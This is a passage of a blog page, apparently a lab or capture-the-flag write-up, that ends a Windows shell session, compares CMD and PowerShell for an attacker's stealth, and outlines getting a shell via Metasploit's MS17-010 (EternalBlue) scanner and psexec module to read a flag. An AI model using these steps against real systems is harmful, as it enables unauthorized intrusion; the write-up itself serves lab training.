+</span></span><span style="display:flex;"><span>Channel <span style="color:#ae81ff">1</span> created.
+</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>Version 10.0.14393<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2016</span> Microsoft Corporation. All rights reserved.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;
+</span></span></code></pre></div><h2 id="cmd-prompt-and-powershell-for-fun-and-profit"><code>CMD-Prompt and PowerShell for Fun and Profit</code><a hidden class="anchor" aria-hidden="true" href="#cmd-prompt-and-powershell-for-fun-and-profit">#</a></h2>
+<p>Use <code>CMD</code> when:</p>
+<ul>
+<li>You are on an older host that may not include PowerShell.</li>
+<li>When you only require simple interactions/access to the host.</li>
+<li>When you plan to use simple batch files, net commands, or MS-DOS native tools.</li>
+<li>When you believe that execution policies may affect your ability to run scripts or other actions on the host.</li>
+</ul>
+<p>Use <code>PowerShell</code> when:</p>
+<ul>
+<li>You are planning to utilize cmdlets or other custom-built scripts.</li>
+<li>When you wish to interact with .NET objects instead of text output.</li>
+<li>When being stealthy is of lesser concern.</li>
+<li>If you are planning to interact with cloud-based services and hosts.</li>
+<li>If your scripts set and use Aliases.</li>
+</ul>
+<h2 id="challenge">Challenge<a hidden class="anchor" aria-hidden="true" href="#challenge">#</a></h2>
+<ol>
+<li>Gain a shell on the vulnerable target, then submit the contents of the flag.txt file that can be found in C:\</li>
+</ol>
+<ul>
+<li>First scan the target and yep we see 445 is open</li>
+<li>start msfconsole and use the smb eternal blue scanner ms17_010</li>
+<li>Voila!! its vulnerable</li>
+<li>now use the ms17_010_psexec and grab an interactive shell on the target</li>
+<li>Voila!! type the flag</li>
+</ul>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="//localhost:1313/tags/windows/">Windows</a></li>
+      <li><a href="//localhost:1313/tags/exploits/">Exploits</a></li>
+    </ul>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="//localhost:1313/">M1$C0NF1G</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
